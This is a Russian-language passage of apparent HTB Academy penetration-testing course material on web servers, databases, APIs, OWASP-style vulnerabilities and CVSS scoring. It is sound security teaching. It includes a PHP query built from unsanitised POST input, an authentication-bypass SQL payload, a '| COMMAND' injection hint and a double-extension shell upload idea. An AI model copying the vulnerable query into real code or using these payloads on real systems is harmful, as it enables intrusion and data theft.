| `504 Gateway Timeout` | Сервер действует как шлюз и не может получить ответ вовремя |

Веб-серверы также принимают различные типы пользовательского ввода в рамках HTTP-запросов, включая текст, **[JSON](https://www.w3schools.com/js/js_json_intro.asp)** и даже двоичные данные (например, для загрузки файлов). После получения веб-запроса веб-сервер отвечает за его маршрутизацию к месту назначения, выполнение любых процессов, необходимых для этого запроса, и возврат ответа пользователю на клиентской стороне. Страницы и файлы, которые веб-сервер обрабатывает и к которым направляет трафик, являются основными файлами веб-приложения.

Ниже показан пример запроса страницы в терминале Linux с использованием утилиты **[cURL](https://en.wikipedia.org/wiki/CURL)** и получения ответа сервера при использовании флага `-I`, который отображает заголовки:

```bash
Solrikk@htb[/htb]$ curl -I https://academy.hackthebox.com

HTTP/2 200
date: Tue, 15 Dec 2020 19:54:29 GMT
content-type: text/html; charset=UTF-8
...SNIP...
```

Тогда как эта команда `cURL` показывает нам исходный код веб-страницы:

```bash
Solrikk@htb[/htb]$ curl https://academy.hackthebox.com

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Cyber Security Training : HTB Academy</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

Множество типов веб-серверов можно использовать для запуска веб-приложений. Большинство из них могут обрабатывать все типы сложных HTTP-запросов, и обычно они бесплатны. Мы даже можем разработать свой собственный базовый веб-сервер, используя такие языки, как `Python`, `JavaScript` и `PHP`. Однако для каждого языка существует популярное веб-приложение, которое оптимизировано для обработки больших объемов веб-трафика, что экономит нам время на создание собственного веб-сервера.

---

## Apache

![Apache логотип с пером.](https://academy.hackthebox.com/storage/modules/75/apache.png)

**[Apache](https://www.apache.org/)** 'или `httpd`' является наиболее распространенным веб-сервером в интернете, обслуживающим более `40%` всех интернет-сайтов. `Apache` обычно предустановлен в большинстве дистрибутивов `Linux` и также может быть установлен на серверы Windows и macOS.

`Apache` обычно используется с `PHP` для разработки веб-приложений, но также поддерживает другие языки, такие как `.Net`, `Python`, `Perl` и даже языки ОС, такие как `Bash`, через `CGI`. Пользователи могут устанавливать широкий спектр модулей `Apache` для расширения его функциональности и поддержки большего количества языков. Например, для поддержки обслуживания файлов `PHP` пользователи должны установить `PHP` на серверной части, а также установить модуль `mod_php` для `Apache`.

`Apache` является проектом с открытым исходным кодом, и пользователи сообщества могут получить доступ к его исходному коду для исправления проблем и поиска уязвимостей. Он хорошо поддерживается и регулярно обновляется против уязвимостей, чтобы обеспечить безопасность от эксплуатации. Кроме того, он очень хорошо документирован, что делает использование и настройку различных частей веб-сервера относительно простыми. `Apache` обычно используется стартапами и небольшими компаниями, поскольку для него просто разрабатывать. Тем не менее, некоторые крупные компании используют Apache, включая:

| `Apple` | `Adobe` | `Baidu` |
|---------|---------|---------|

---

## NGINX

![NGINX логотип.](https://academy.hackthebox.com/storage/modules/75/nginx.png)

**[NGINX](https://www.nginx.com/)** является вторым по распространенности веб-сервером в интернете, обслуживающим примерно `30%` всех интернет-сайтов. `NGINX` фокусируется на обслуживании множества одновременных веб-запросов с относительно низкой нагрузкой на память и процессор, используя для этого асинхронную архитектуру. Это делает `NGINX` очень надежным веб-сервером для популярных веб-приложений и ведущих предприятий по всему миру, поэтому он является самым популярным веб-сервером среди высоконагруженных сайтов, с около 60% из топ-100,000 сайтов, использующих `NGINX`.

`NGINX` также бесплатен и имеет открытый исходный код, что дает все те же преимущества, упомянутые ранее, такие как безопасность и надежность. Некоторые популярные сайты, использующие `NGINX`, включают:

| `Google` | `Facebook` | `Twitter` | `Cisco` | `Intel` | `Netflix` | `HackTheBox` |
|----------|------------|-----------|---------|---------|-----------|--------------|

---

## IIS

![Microsoft IIS логотип.](https://academy.hackthebox.com/storage/modules/75/iis.png)

**[IIS (Internet Information Services)](https://en.wikipedia.org/wiki/Internet_Information_Services)** является третьим по распространенности веб-сервером в интернете, обслуживающим около `15%` всех интернет-сайтов. `IIS` разрабатывается и поддерживается Microsoft и в основном работает на серверах Microsoft Windows. `IIS` обычно используется для размещения веб-приложений, разработанных для фреймворка Microsoft .NET, но также может использоваться для размещения веб-приложений, разработанных на других языках, таких как `PHP`, или для размещения других типов служб, таких как `FTP`. Кроме того, `IIS` очень хорошо оптимизирован для интеграции с Active Directory и включает такие функции, как `Windows Auth` для аутентификации пользователей с использованием Active Directory, позволяя им автоматически входить в веб-приложения.

Хотя и не самый популярный веб-сервер, многие крупные организации используют `IIS` в качестве своего веб-сервера. Многие из них используют Windows Server на своей серверной части или сильно полагаются на Active Directory в своей организации. Некоторые популярные сайты, использующие IIS, включают:

| `Microsoft` | `Office365` | `Skype` | `Stack Overflow` | `Dell` |
|-------------|-------------|---------|------------------|--------|

Помимо этих 3 веб-серверов, существует множество других часто используемых веб-серверов, таких как **[Apache Tomcat](https://tomcat.apache.org/)** для веб-приложений `Java` и **[Node.JS](https://nodejs.org/en/)** для веб-приложений, разработанных с использованием `JavaScript` на серверной части.

## Вопросы

**Если веб-сервер возвращает HTTP-код 201, что это означает?**

*Подсказка: Отправьте только название кода, без номера кода. Например, для кода (200 OK) ответом будет просто 'OK'.*









# 2.3 Базы данных

---

Веб-приложения используют базы данных в бэкенде для хранения различного контента и информации, связанной с веб-приложением. Это могут быть основные ресурсы веб-приложения, такие как изображения и файлы, контент веб-приложения, такой как посты и обновления, или пользовательские данные, такие как имена пользователей и пароли. Это позволяет веб-приложениям легко и быстро сохранять и извлекать данные, а также обеспечивать динамический контент, который отличается для каждого пользователя.

Существует множество различных типов баз данных, каждый из которых подходит для определенного типа использования. Большинство разработчиков ищут определенные характеристики в базе данных, такие как **скорость** при сохранении и извлечении данных, **размер** при хранении больших объемов данных, **масштабируемость** по мере роста веб-приложения и **стоимость**.

---

## Реляционные (SQL)

Реляционные (SQL) базы данных хранят свои данные в таблицах, строках и столбцах. Каждая таблица может иметь уникальные ключи, которые могут связывать таблицы вместе и создавать отношения между таблицами.

Например, у нас может быть таблица `users` в реляционной базе данных, содержащая столбцы, такие как `id`, `username`, `first_name`, `last_name` и так далее. `id` может использоваться как ключ таблицы. Другая таблица, `posts`, может содержать посты, созданные всеми пользователями, со столбцами, такими как `id`, `user_id`, `date`, `content` и так далее.

![Схема базы данных с таблицей 'users', показывающей ID, имена пользователей, имена и фамилии, и таблицей 'posts', показывающей ID постов, ID пользователей, даты и содержимое.](https://academy.hackthebox.com/storage/modules/75/web_apps_relational_db.jpg)

Мы можем связать `id` из таблицы `users` с `user_id` в таблице `posts`, чтобы легко извлекать данные пользователя для каждого поста, без необходимости хранить все данные пользователя с каждым постом.

Таблица может иметь более одного ключа, поскольку другой столбец может использоваться как ключ для связи с другой таблицей. Например, столбец `id` может использоваться как ключ для связи таблицы `posts` с другой таблицей, содержащей комментарии, каждый из которых принадлежит определенному посту, и так далее.

> **Примечание:** Отношение между таблицами в базе данных называется Схемой.

Таким образом, используя реляционные базы данных, становится очень быстро и легко извлекать все данные об определенном элементе из всех баз данных. Например, мы можем извлечь все детали, связанные с определенным пользователем, из всех таблиц одним запросом. Это делает реляционные базы данных очень быстрыми и надежными для больших наборов данных, которые имеют четкую структуру и дизайн. Базы данных также делают управление данными очень эффективным.

Некоторые из наиболее распространенных реляционных баз данных включают:

| Тип | Описание |
|-----|----------|
| **MySQL** | Наиболее часто используемая база данных в интернете. Это база данных с открытым исходным кодом, которую можно использовать совершенно бесплатно |
| **MSSQL** | Реализация реляционной базы данных от Microsoft. Широко используется с серверами Windows и веб-серверами IIS |
| **Oracle** | Очень надежная база данных для больших предприятий, которая часто обновляется инновационными решениями баз данных, чтобы сделать ее быстрее и надежнее. Может быть дорогой даже для крупных предприятий |
| **PostgreSQL** | Еще одна бесплатная база данных с открытым исходным кодом. Она разработана для легкого расширения, позволяя добавлять новые продвинутые функции без необходимости серьезных изменений в первоначальном дизайне базы данных |

Другие распространенные SQL базы данных включают: `SQLite`, `MariaDB`, `Amazon Aurora` и `Azure SQL`.

---

## Нереляционные (NoSQL)

Нереляционная база данных не использует таблицы, строки, столбцы, первичные ключи, отношения или схемы. Вместо этого база данных `NoSQL` хранит данные, используя различные модели хранения, в зависимости от типа хранимых данных.

Из-за отсутствия определенной структуры для базы данных, базы данных `NoSQL` очень масштабируемы и гибки. При работе с наборами данных, которые не очень хорошо определены и структурированы, база данных `NoSQL` будет лучшим выбором для хранения наших данных.

Существует 4 распространенные модели хранения для баз данных `NoSQL`:

- Ключ-Значение
- На основе документов
- Широкие столбцы
- График

Каждая из вышеперечисленных моделей имеет различный способ хранения данных. Например, модель `Ключ-Значение` обычно хранит данные в `JSON` или `XML` и имеет ключ для каждой пары, сохраняя все свои данные в качестве значения:

![Таблица постов с ID, датами и содержимым, показывающая пары ключ-значение](https://academy.hackthebox.com/storage/modules/75/web_apps_non-relational_db.jpg)

Приведенный выше пример может быть представлен с использованием `JSON` следующим образом:

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

Это выглядит похоже на словарь/карту/пару ключ-значение в языках типа `Python` или `PHP` (т.е. `{'key':'value'}`), где `ключ` обычно является строкой, а `значение` может быть строкой, словарем или любым объектом класса.

Модель `На основе документов` хранит данные в сложных объектах `JSON`, и каждый объект имеет определенные мета-данные, храня остальные данные аналогично модели `Ключ-Значение`.

Некоторые из наиболее распространенных баз данных `NoSQL` включают:

| Тип | Описание |
|-----|----------|
| **MongoDB** | Наиболее распространенная база данных `NoSQL`. Она бесплатная и с открытым исходным кодом, использует модель `На основе документов` и хранит данные в объектах `JSON` |
| **ElasticSearch** | Еще одна бесплатная база данных `NoSQL` с открытым исходным кодом. Она оптимизирована для хранения и анализа огромных наборов данных. Как следует из названия, поиск данных в этой базе данных очень быстрый и эффективный |
| **Apache Cassandra** | Также бесплатная и с открытым исходным кодом. Она очень масштабируема и оптимизирована для изящной обработки ошибочных значений |

Другие распространенные базы данных `NoSQL` включают: `Redis`, `Neo4j`, `CouchDB` и `Amazon DynamoDB`.

---

## Использование в веб-приложениях

Большинство современных языков веб-разработки и фреймворков упрощают интеграцию, хранение и извлечение данных из различных типов баз данных. Но сначала база данных должна быть установлена и настроена на сервере бэкенда, и как только она запущена и работает, веб-приложения могут начать использовать ее для хранения и извлечения данных.

Например, в веб-приложении `PHP`, как только `MySQL` запущена и работает, мы можем подключиться к серверу базы данных с помощью:

```php
$conn = new mysqli("localhost", "user", "pass");
```

Затем мы можем создать новую базу данных с помощью:

```php
$sql = "CREATE DATABASE database1";
$conn->query($sql)
```

После этого мы можем подключиться к нашей новой базе данных и начать использовать базу данных `MySQL` через синтаксис `MySQL` прямо в `PHP`, следующим образом:

```php
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```

Веб-приложения обычно используют пользовательский ввод при извлечении данных. Например, когда пользователь использует функцию поиска для поиска других пользователей, их поисковый запрос передается веб-приложению, которое использует ввод для поиска в базе(ах) данных.

```php
$searchInput =  $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```

Наконец, веб-приложение отправляет результат обратно пользователю:

```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

Этот базовый пример показывает нам, насколько легко использовать базы данных. Однако, если код не написан безопасно, код базы данных может привести к различным проблемам, таким как уязвимости SQL-инъекций.









# 2.4 Фреймворки разработки и API

В дополнение к веб-серверам, которые могут размещать веб-приложения на различных языках, существует множество распространенных фреймворков веб-разработки, которые помогают в разработке основных файлов и функциональности веб-приложений. С возрастающей сложностью веб-приложений может быть сложно создать современное и сложное веб-приложение с нуля. Поэтому большинство популярных веб-приложений разрабатываются с использованием веб-фреймворков.

Поскольку большинство веб-приложений имеют общую функциональность, такую как регистрация пользователей, фреймворки веб-разработки упрощают быструю реализацию этой функциональности и связывают её с компонентами переднего плана, создавая полнофункциональное веб-приложение. Некоторые из наиболее распространенных фреймворков веб-разработки включают:

- [Laravel](https://laravel.com/) (`PHP`): обычно используется стартапами и небольшими компаниями, поскольку он мощный, но простой в разработке.
- [Express](https://expressjs.com/) (`Node.JS`): используется `PayPal`, `Yahoo`, `Uber`, `IBM` и `MySpace`.
- [Django](https://www.djangoproject.com/) (`Python`): используется `Google`, `YouTube`, `Instagram`, `Mozilla` и `Pinterest`.
- [Rails](https://rubyonrails.org/) (`Ruby`): используется `GitHub`, `Hulu`, `Twitch`, `Airbnb` и даже `Twitter` в прошлом.

> **Примечание:** Следует отметить, что популярные веб-сайты обычно используют множество фреймворков и веб-серверов, а не только один.

---

## API

Важным аспектом разработки серверной части веб-приложений является использование веб-[API](https://en.wikipedia.org/wiki/API) и параметров HTTP-запросов для соединения переднего и заднего плана, чтобы иметь возможность отправлять данные туда и обратно между компонентами переднего и заднего плана и выполнять различные функции в веб-приложении.

Для того чтобы компонент переднего плана взаимодействовал с задним планом и запрашивал выполнение определенных задач, они используют API для запроса у компонента заднего плана выполнения конкретной задачи с конкретными входными данными. Компоненты заднего плана обрабатывают эти запросы, выполняют необходимые функции и возвращают определенный ответ компонентам переднего плана, которые в конечном итоге отображают вывод конечного пользователя на стороне клиента.

---

#### Параметры запроса

Стандартным методом отправки конкретных аргументов на веб-страницу является использование параметров запросов `GET` и `POST`. Это позволяет компонентам переднего плана указывать значения для определенных параметров, используемых на странице, чтобы компоненты заднего плана могли их обработать и соответственно ответить.

Например, страница `/search.php` будет принимать параметр `item`, который может использоваться для указания элемента поиска. Передача параметра через запрос `GET` выполняется через URL `/search.php?item=apples`, в то время как параметры `POST` передаются через данные `POST` в нижней части HTTP-запроса `POST`:

```http
POST /search.php HTTP/1.1
...SNIP...

item=apples
```

Параметры запроса позволяют одной странице получать различные типы входных данных, каждый из которых может обрабатываться по-разному. Для некоторых других сценариев веб-API могут быть гораздо быстрее и эффективнее в использовании. [Модуль веб-запросов](https://academy.hackthebox.com/course/preview/web-requests) углубляется в HTTP-запросы.

---

## Веб-API

API ([Интерфейс прикладного программирования](https://en.wikipedia.org/wiki/API)) - это интерфейс внутри приложения, который определяет, как приложение может взаимодействовать с другими приложениями. Для веб-приложений это то, что позволяет удаленный доступ к функциональности компонентов заднего плана. API не являются исключительными для веб-приложений и используются для программных приложений в целом. Веб-API обычно доступны через протокол `HTTP` и обычно обрабатываются и переводятся через веб-серверы.

![API диаграмма с подключениями к облаку, пользователю, покупкам, видео, аудио и ключевым иконкам](https://academy.hackthebox.com/storage/modules/75/api_examples.jpg)

Веб-приложение погоды, например, может иметь определенный API для получения текущей погоды для определенного города. Мы можем запросить URL API и передать название города или ID города, и он вернет текущую погоду в объекте `JSON`. Другой пример - API Twitter, который позволяет нам получать последние твиты с определенного аккаунта в форматах `XML` или `JSON`, и даже позволяет нам отправлять твит (если аутентифицирован) и так далее.

Чтобы включить использование API в веб-приложении, разработчики должны разработать эту функциональность на заднем плане веб-приложения, используя стандарты API, такие как `SOAP` или `REST`.

---

## SOAP

Стандарт `SOAP` ([Simple Objects Access](https://en.wikipedia.org/wiki/SOAP)) обменивается данными через `XML`, где запрос делается в `XML` через HTTP-запрос, а ответ также возвращается в `XML`. Компоненты переднего плана разработаны для правильного разбора этого вывода `XML`. Следующий пример сообщения `SOAP`:

```xml
<?xml version="1.0"?>

<soap:Envelope
xmlns:soap="http://www.example.com/soap/soap/"
soap:encodingStyle="http://www.w3.org/soap/soap-encoding">

<soap:Header>
</soap:Header>

<soap:Body>
  <soap:Fault>
  </soap:Fault>
</soap:Body>

</soap:Envelope>
```

`SOAP` очень полезен для передачи структурированных данных (например, целого объекта класса) или даже двоичных данных, и часто используется с сериализованными объектами, все это позволяет обмениваться сложными данными между компонентами переднего и заднего плана и правильно их разбирать. Он также очень полезен для обмена *состояниями* объектов - то есть обмена/изменения текущего состояния веб-страницы, что становится более распространенным с современными веб-приложениями и мобильными приложениями.

Однако `SOAP` может быть сложным для использования новичками или требовать длинных и сложных запросов даже для небольших запросов, таких как базовые запросы `search` или `filter`. Здесь стандарт API `REST` более полезен.

---

## REST

Стандарт `REST` ([Representational State Transfer](https://en.wikipedia.org/wiki/Representational_state_transfer)) обменивается данными через путь URL (то есть `search/users/1`) и обычно возвращает вывод в формате `JSON` (то есть пользователь `1`).

В отличие от параметров запроса, API `REST` обычно фокусируются на страницах, которые ожидают один тип входных данных, передаваемых непосредственно через путь URL, без указания его имени или типа. Это обычно полезно для запросов типа `search`, `sort` или `filter`. Вот почему API `REST` обычно разбивают функциональность веб-приложения на более мелкие API и используют эти меньшие API-запросы, чтобы позволить веб-приложению выполнять более сложные действия, делая веб-приложение более модульным и масштабируемым.

Ответы на запросы API `REST` обычно делаются в формате `JSON`, и компоненты переднего плана затем разрабатываются для обработки этого ответа и правильного его отображения. Другие выходные форматы для `REST` включают `XML`, `x-www-form-urlencoded` или даже сырые данные. Как видно ранее в разделе `database`, следующий пример ответа `JSON` на API-запрос `GET /category/posts/`:

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

`REST` использует различные HTTP-методы для выполнения различных действий в веб-приложении:

- Запрос `GET` для получения данных
- Запрос `POST` для создания данных (неидемпотентный)
- Запрос `PUT` для создания или замены существующих данных (идемпотентный)
- Запрос `DELETE` для удаления данных










# 2.5 Распространенные уязвимости веб-приложений

---

Если мы проводили тест на проникновение внутренне разработанного веб-приложения или не нашли никаких публичных эксплойтов для публичного веб-приложения, мы можем вручную выявить несколько уязвимостей. Мы также можем обнаружить уязвимости, вызванные неправильными конфигурациями, даже в публично доступных веб-приложениях, поскольку такие типы уязвимостей не вызваны публичной версией веб-приложения, а неправильной конфигурацией, созданной разработчиками. Приведенные ниже примеры являются одними из наиболее распространенных типов уязвимостей для веб-приложений, частью [OWASP Top 10](https://owasp.org/www-project-top-ten/) уязвимостей для веб-приложений.

---

## Нарушенная аутентификация/контроль доступа

`Нарушенная аутентификация` и `Нарушенный контроль доступа` входят в число наиболее распространенных и наиболее опасных уязвимостей для веб-приложений.

`Нарушенная аутентификация` относится к уязвимостям, которые позволяют злоумышленникам обходить функции аутентификации. Например, это может позволить злоумышленнику войти в систему без действительного набора учетных данных или позволить обычному пользователю стать администратором без соответствующих привилегий.

`Нарушенный контроль доступа` относится к уязвимостям, которые позволяют злоумышленникам получить доступ к страницам и функциям, к которым у них не должно быть доступа. Например, обычный пользователь получает доступ к панели администратора.

Например, `College Management System 1.2` имеет простую уязвимость [обхода аутентификации](https://www.exploit-db.com/exploits/47388), которая позволяет нам войти в систему без учетной записи, введя следующее в поле email: `' or 0=0 #`, и используя любой пароль.

---

## Загрузка вредоносных файлов

Еще один распространенный способ получить контроль над веб-приложениями - это загрузка вредоносных скриптов. Если веб-приложение имеет функцию загрузки файлов и не проверяет загружаемые файлы должным образом, мы можем загрузить вредоносный скрипт (например, `PHP`-скрипт), который позволит нам выполнять команды на удаленном сервере.

Несмотря на то, что это базовая уязвимость, многие разработчики не знают об этих угрозах, поэтому они не проверяют и не валидируют загружаемые файлы должным образом. Кроме того, некоторые разработчики выполняют проверки и пытаются валидировать загружаемые файлы, но эти проверки часто можно обойти, что все равно позволит нам загрузить вредоносные скрипты.

Например, плагин WordPress `Responsive Thumbnail Slider 1.0` может быть использован для загрузки любого произвольного файла, включая вредоносные скрипты, путем загрузки файла с двойным расширением (например, `shell.php.jpg`). Даже есть [модуль Metasploit](https://www.rapid7.com/db/modules/exploit/multi/http/wp_responsive_thumbnail_slider_upload/), который позволяет легко эксплуатировать эту уязвимость.

---

## Внедрение команд

Многие веб-приложения выполняют локальные команды операционной системы для выполнения определенных процессов. Например, веб-приложение может установить плагин по нашему выбору, выполнив команду ОС, которая скачивает этот плагин, используя предоставленное имя плагина. Если они не отфильтрованы и не санитизированы должным образом, злоумышленники могут внедрить другую команду для выполнения вместе с изначально задуманной командой (например, в качестве имени плагина), что позволяет им напрямую выполнять команды на бэкенд-сервере и получить контроль над ним. Этот тип уязвимости называется [внедрением команд](https://owasp.org/www-community/attacks/Command_Injection).

Эта уязвимость широко распространена, поскольку разработчики могут не санитизировать пользовательский ввод должным образом или использовать слабые тесты для этого, позволяя злоумышленникам обходить любые проверки или фильтрацию и выполнять свои команды.

Например, плагин WordPress `Plainview Activity Monitor 20161228` имеет [уязвимость](https://www.exploit-db.com/exploits/45274), которая позволяет злоумышленникам внедрить свою команду в значение `ip`, просто добавив `| КОМАНДА...` после значения `ip`.

---

## SQL-инъекция (SQLi)

Еще одна очень распространенная уязвимость в веб-приложениях - это уязвимость `SQL-инъекции`. Подобно уязвимости внедрения команд, эта уязвимость может возникнуть, когда веб-приложение выполняет SQL-запрос, включая значение, взятое из пользовательского ввода.

Например, в разделе `база данных` мы видели пример того, как веб-приложение использует пользовательский ввод для поиска в определенной таблице, с помощью следующей строки кода:

```php
$query = "select * from users where name like '%$searchInput%'";
```

Если пользовательский ввод не отфильтрован и не валидирован должным образом (как в случае с `внедрением команд`), мы можем выполнить другой SQL-запрос вместе с этим запросом, что в конечном итоге может позволить нам взять контроль над базой данных и ее хостинг-сервером.

Например, та же предыдущая `College Management System 1.2` страдает от уязвимости SQL-инъекции [vulnerability](https://www.exploit-db.com/exploits/47388), при которой мы можем выполнить другой `SQL`-запрос, который всегда возвращает `true`, что означает успешную аутентификацию, что позволяет нам войти в приложение. Мы можем использовать ту же уязвимость для извлечения данных из базы данных или даже получения контроля над хостинг-сервером.

Мы будем сталкиваться с этими уязвимостями снова и снова в нашем обучении и в реальных оценках. Важно ознакомиться с каждой из них, поскольку даже базовое понимание каждой даст нам преимущество в любой области информационной безопасности. Последующие модули подробно рассмотрят каждую из этих уязвимостей.










# 2.6 Публичные уязвимости

Наиболее критичными уязвимостями компонентов бэкенда являются те, которые могут быть атакованы извне и могут быть использованы для получения контроля над бэкенд-сервером без необходимости локального доступа к этому серверу (т.е., внешнее тестирование на проникновение). Эти уязвимости обычно вызваны ошибками кодирования, допущенными в процессе разработки бэкенд-компонентов веб-приложения. Таким образом, существует широкий спектр типов уязвимостей в этой области, от базовых уязвимостей, которые могут быть эксплуатированы с относительной легкостью, до сложных уязвимостей, требующих глубоких знаний всего веб-приложения.

---

## Публичные CVE

Поскольку многие организации разворачивают веб-приложения, которые используются публично, такие как открытые и проприетарные веб-приложения, эти веб-приложения часто тестируются многими организациями и экспертами по всему миру. Это приводит к частому обнаружению большого количества уязвимостей, большинство из которых исправляются, а затем публикуются и получают запись и оценку CVE ([Common Vulnerabilities and Exposures](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures)).

Многие тестировщики на проникновение также создают концептуальные эксплойты для проверки того, может ли быть использована определенная публичная уязвимость, и обычно делают эти эксплойты доступными для публичного использования в целях тестирования и обучения. Это делает поиск публичных эксплойтов самым первым шагом, который мы должны пройти для веб-приложений.

> **Совет:** Первым шагом является определение версии веб-приложения. Это можно найти во многих местах, например, в исходном коде веб-приложения. Для веб-приложений с открытым исходным кодом мы можем проверить репозиторий веб-приложения и определить, где показан номер версии (например, на странице version.php), а затем проверить ту же страницу в нашем целевом веб-приложении для подтверждения.

После того как мы определили версию веб-приложения, мы можем искать в Google публичные эксплойты для этой версии веб-приложения. Мы также можем использовать онлайн-базы данных эксплойтов, такие как [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/) или [Vulnerability Lab](https://www.vulnerability-lab.com/). Следующий пример показывает поиск публичных эксплойтов WordPress в [Rapid7 DB](https://www.rapid7.com/db/):

![Страница базы данных уязвимостей и эксплойтов, показывающая результаты поиска по уязвимостям 'WordPress', включая детали CVE и серьезность](https://academy.hackthebox.com/storage/modules/75/rapid7-db.jpg)

Обычно нас интересуют эксплойты с оценкой CVE 8-10 или эксплойты, которые приводят к `Remote Code Execution` (Удаленное выполнение кода). Другие типы публичных эксплойтов также должны рассматриваться, если ничего из вышеперечисленного недоступно.

Кроме того, эти уязвимости не ограничиваются веб-приложениями и применимы к компонентам, используемым веб-приложением. Если веб-приложение использует внешние компоненты (например, плагин), мы также должны искать уязвимости для этих внешних компонентов.

---

## Общая система оценки уязвимостей (CVSS)

[Общая система оценки уязвимостей (CVSS)](https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System) - это промышленный стандарт с открытым исходным кодом для оценки серьезности уязвимостей безопасности. Эта система оценки часто используется в качестве стандартного измерения для организаций и правительств, которым необходимо создавать точные и последовательные оценки серьезности для уязвимостей их систем. Это помогает с приоритизацией ресурсов и реагированием на данную угрозу.

Оценки CVSS основаны на формуле, которая использует несколько метрик: `Base` (Базовые), `Temporal` (Временные) и `Environmental` (Экологические). При расчете серьезности уязвимости с использованием CVSS, метрики `Base` создают оценку в диапазоне от 0 до 10, модифицированную применением метрик `Temporal` и `Environmental`. [Национальная база данных уязвимостей (NVD)](https://nvd.nist.gov/) предоставляет оценки CVSS почти для всех известных, публично раскрытых уязвимостей. В настоящее время NVD предоставляет только оценки `Base`, основанные на присущих уязвимости характеристиках. Текущие системы оценки - это CVSS v2 и CVSS v3. Существует несколько различий между системами v2 и v3, а именно изменения в группах `Base` и `Environmental` для учета дополнительных метрик. Более подробную информацию о различиях между двумя системами оценки можно найти [здесь](https://www.balbix.com/insights/cvss-v2-vs-cvss-v3).

Рейтинги оценки CVSS немного отличаются между V2 и V3, как видно из следующих таблиц:

| **CVSS V2.0 Рейтинги** |               |
|-------------------------|---------------|
| **Серьезность**         | **Диапазон базовой оценки** |
| Низкая                  | 0.0-3.9       |
| Средняя                 | 4.0-6.9       |
| Высокая                 | 7.0-10.0      |

| **CVSS V3.0 Рейтинги** |               |
|-------------------------|---------------|
| **Серьезность**         | **Диапазон базовой оценки** |
| Нет                     | 0.0           |
| Низкая                  | 0.1-3.9       |
| Средняя                 | 4.0-6.9       |
| Высокая                 | 7.0-8.9       |
| Критическая             | 9.0-10.0      |

NVD не учитывает метрики `Temporal` и `Environmental`, поскольку первые могут изменяться со временем из-за внешних событий. Последние представляют собой настраиваемую метрику, основанную на потенциальном воздействии уязвимости на конкретную организацию. NVD предоставляет [калькулятор CVSS v2](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator) и [калькулятор CVSS v3](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator), которые организации могут использовать для учета дополнительного риска от данных `Temporal` и `Environmental`, уникальных для них. Калькуляторы очень интерактивны и могут использоваться для тонкой настройки оценки CVSS под нашу среду. Мы можем навести курсор на каждую метрику, чтобы прочитать больше о ней и точно определить, как она применяется к нашей организации. Ниже приведен пример вида калькулятора CVSS v3:

![Таблица метрик оценки CVSS, показывающая базовые, временные и экологические метрики оценки с различными факторами воздействия и эксплуатируемости](https://academy.hackthebox.com/storage/modules/75/cvssv3_calc.png)

Поэкспериментируйте с калькулятором CVSS и посмотрите, как различные метрики могут быть скорректированы для получения данной оценки. Просмотрите некоторые CVE и попытайтесь прийти к той же оценке CVSS. Как изменяется оценка CVSS при применении метрик `Temporal` и `Environmental`? Это удобное [руководство](https://www.first.org/cvss/user-guide) крайне полезно для понимания V2 и V3 и того, как использовать калькуляторы для получения данной оценки.

---

## Уязвимости бэкенд-сервера

Как и публичные уязвимости для веб-приложений, мы также должны рассмотреть поиск уязвимостей для других компонентов бэкенда, таких как бэкенд-сервер или веб-сервер.

Наиболее критичные уязвимости для компонентов бэкенда находятся в веб-серверах, поскольку они публично доступны через протокол `TCP`. Примером хорошо известной уязвимости веб-сервера является `Shell-Shock`, которая затронула веб-серверы Apache, выпущенные в 2014 году и ранее, и использовала `HTTP` запросы для получения удаленного контроля над бэкенд-сервером.

Что касается уязвимостей в бэкенд-сервере или базе данных, они обычно используются после получения локального доступа к бэкенд-серверу или бэкенд-сети, что может быть получено через `внешние` уязвимости или во время внутреннего тестирования на проникновение. Они обычно используются для получения высокопривилегированного доступа к бэкенд-серверу или бэкенд-сети или получения контроля над другими серверами в той же сети.

Хотя они не эксплуатируются напрямую извне, эти уязвимости по-прежнему критичны и должны быть исправлены для защиты всего веб-приложения от компрометации.


